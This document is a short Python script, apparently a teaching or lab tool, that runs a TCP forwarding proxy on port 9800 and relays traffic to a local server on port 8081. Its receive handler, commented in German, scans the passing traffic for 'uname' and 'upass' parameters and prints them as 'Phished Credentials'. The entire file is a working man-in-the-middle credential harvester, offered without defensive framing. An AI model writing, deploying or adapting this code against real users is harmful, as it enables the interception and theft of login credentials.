#!/usr/bin/python
#
# ForwardProxy
import sys
import time
import socket
import select
import re

# Socket options
delay = 0.0001
buffer_size = 4096

# Proxy options
proxyPort = 9800
proxyBinding = '0.0.0.0'
proxyForwardTo = ('127.0.0.1', 8081)
proxyAuthentication = False # Re-implement authenticate() and verifyUserAccount(), if use!

uname_phished = ""
upass_phished = ""

class Forward:

    def __init__(self):
        self.forward = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def start(self, host, port):
        try:
            self.forward.connect((host, port))
            print("Forward", [host, port], "connected")
            return self.forward
        except Exception as e:
            print(e)
            return False

class Proxy:

    input_list = []
    channel = {}

    def __init__(self, host, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((host, port))
        self.server.listen(200)

    def main_loop(self):
        self.input_list.append(self.server)
        while 1:
            time.sleep(delay)
            ss = select.select
            inputready, outputready, exceptready = ss(self.input_list, [], [])
            for self.s in inputready:
                if self.s == self.server:
                    self.on_accept()
                    break

                try:
                    self.data = self.s.recv(buffer_size)
                    if len(self.data) == 0:
                        self.on_close()
                        break
                    else:
                        self.on_recv()

                except Exception as e:
                    print(e)
                    self.on_close()
                    break

    def on_accept(self):
        clientsock, clientaddr = self.server.accept()

        print("Connecting client", clientaddr)

        forward = Forward().start(proxyForwardTo[0], proxyForwardTo[1])
        if forward:
            print("Client", clientaddr, "connected")
            self.input_list.append(clientsock)
            self.input_list.append(forward)
            self.channel[clientsock] = forward
            self.channel[forward] = clientsock
        else:
            print("Can't establish connection with remote server")
            print("Closing connection with client", clientaddr)
            clientsock.close()

    def on_close(self):
        try:
            print(self.s.getpeername(), "disconnected")
        except Exception as e:
            print(e)
            print("Client closed")

        self.input_list.remove(self.s)
        self.input_list.remove(self.channel[self.s])
        out = self.channel[self.s]
        self.channel[out].close()  # equivalent to do self.s.close()
        self.channel[self.s].close()
        del self.channel[out]
        del self.channel[self.s]

    def on_recv(self):
        global uname_phished, upass_phished  # Zugriff auf die globalen Variablen
        data = self.data.decode("utf-8", errors="ignore")  # Daten als String verarbeiten

        # Prüfen, ob die Anfrage `uname` und `upass` enthält (HTTP GET-Anfrage)
        match = re.search(r'uname=([^&]+)&upass=([^&\s]+)', data)
        if match:
            uname_phished = match.group(1)
            upass_phished = match.group(2)
            print("Phished Credentials:")
            print("Username:", uname_phished)
            print("Password:", upass_phished)

        # Weiterleiten der Daten an das Ziel
        self.channel[self.s].send(data.encode("utf-8"))

if __name__ == '__main__':

    print(' * ForwardProxy')
    proxy = Proxy(proxyBinding, proxyPort)
    print(' * Listening on: ' + str(proxyBinding) + ' : ' + str(proxyPort))
    print(' * Forwarding to: ' + str(proxyForwardTo[0]) + ' : ' + str(proxyForwardTo[1]))
    try:
        proxy.main_loop()
    except KeyboardInterrupt:
        print("Ctrl C - Stopping server")
        sys.exit(1)